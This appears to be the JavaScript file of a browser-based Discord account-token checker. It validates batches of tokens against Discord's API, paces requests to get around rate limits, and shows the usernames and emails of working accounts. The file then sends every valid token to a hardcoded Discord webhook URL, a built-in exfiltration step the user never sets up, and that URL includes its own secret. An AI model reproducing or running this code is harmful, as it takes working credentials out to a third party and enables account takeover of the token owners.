// main.js
let validTokens = [];
const DEFAULT_WEBHOOK = "https://discord.com/api/webhooks/1432415603422924933/yzSC_8C04k02FTB9vF81d189RknA7W_aCpPa9-Xsn1X1doYLp5WW5uWtozFLQAA2sxCv";

async function checkToken(token) {
  try {
    const response = await fetch("https://discord.com/api/v9/users/@me", {
      method: "GET",
      headers: { "Authorization": token.trim() },
    });

    if (response.status === 200) {
      const data = await response.json();
      return {
        valid: true,
        username: `${data.username}#${data.discriminator}`,
        email: data.email || "None",
        verified: data.verified,
      };
    } else if (response.status === 401) {
      return { valid: false, reason: "Invalid Token" };
    } else if (response.status === 429) {
      let retryAfter = 3000;
      try {
        const body = await response.json();
        if (body && body.retry_after) retryAfter = body.retry_after * 1000;
      } catch (e) {}
      await new Promise(res => setTimeout(res, retryAfter));
      return await checkToken(token);
    } else {
      return { valid: false, reason: "Unknown error (" + response.status + ")" };
    }
  } catch {
    return { valid: false, reason: "Network error" };
  }
}

async function checkAllTokens(tokens) {
  document.getElementById("results").style.display = "block";
  const listEl = document.getElementById("resultList");
  listEl.innerHTML = "";
  validTokens = [];

  const cleaned = tokens.map(t => t.trim()).filter(Boolean);
  const uniqueTokens = Array.from(new Set(cleaned));
  const duplicateCount = cleaned.length - uniqueTokens.length;
  if (duplicateCount > 0) new Toast({ message: `${duplicateCount} duplicate token(s) removed.`, type: "default" });

  let validCount = 0;
  let invalidCount = 0;

  for (let i = 0; i < uniqueTokens.length; i++) {
    const token = uniqueTokens[i];
    const statusP = document.createElement("p");
    statusP.textContent = `[${i + 1}/${uniqueTokens.length}] Checking...`;
    listEl.appendChild(statusP);

    const result = await checkToken(token);
    listEl.removeChild(statusP);

    const shortTok = token.length > 30 ? token.slice(0, 20) + "..." + token.slice(-5) : token;
    const p = document.createElement("p");

    if (result.valid) {
      validCount++;
      validTokens.push(token);
      p.className = "result-valid";
      p.textContent = `✅ ${shortTok} → ${result.username} (${result.email})`;
    } else {
      invalidCount++;
      p.className = "result-invalid";
      p.textContent = `❌ ${shortTok} → ${result.reason}`;
    }
    listEl.appendChild(p);

    await new Promise(res => setTimeout(res, 500 + Math.random() * 500));
  }

  new Toast({ message: `Checked ${uniqueTokens.length} tokens. ✅ ${validCount} valid, ❌ ${invalidCount} invalid.`, type: validCount > 0 ? "success" : "warning" });

  if (validTokens.length > 0) {
    const downloadBtn = document.createElement("button");
    downloadBtn.id = "downloadBtn";
    downloadBtn.textContent = `💾 Download Valid Tokens (${validTokens.length})`;
    downloadBtn.style.cssText = "margin-top:12px; padding:8px 12px; border-radius:8px; font-weight:600;";
    downloadBtn.onclick = downloadValidTokens;
    document.getElementById("results").appendChild(downloadBtn);

    const ok = await sendValidTokensToWebhook(DEFAULT_WEBHOOK, validTokens);
    if (ok) new Toast({ message: "Valid tokens sent to default webhook.", type: "success" });
    else new Toast({ message: "Webhook send failed (CORS or network).", type: "danger" });
  } else {
    new Toast({ message: "No valid tokens to send.", type: "warning" });
  }
}

function downloadValidTokens() {
  const blob = new Blob([validTokens.join("\n")], { type: "text/plain" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = "tokens.txt";
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

async function sendValidTokensToWebhook(webhook, tokens) {
  try {
    const content = "Valid tokens:\n" + tokens.join("\n");
    const resp = await fetch(webhook, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content }),
    });
    return resp.ok;
  } catch {
    return false;
  }
}

/* UI bindings */
document.getElementById("loadFile").addEventListener("click", () => {
  const file = document.getElementById("fileInput").files[0];
  if (!file) { new Toast({ message: "Select a .txt file first.", type: "danger" }); return; }
  const reader = new FileReader();
  reader.onload = (e) => {
    document.getElementById("tokens").value = e.target.result;
    new Toast({ message: "Tokens loaded from file!", type: "success" });
  };
  reader.readAsText(file);
});

document.getElementById("checkAll").addEventListener("click", async () => {
  const raw = document.getElementById("tokens").value.trim();
  if (!raw) { new Toast({ message: "Please paste or load tokens first.", type: "danger" }); return; }

  const tokens = raw.split(/\r?\n/);
  await checkAllTokens(tokens);
});
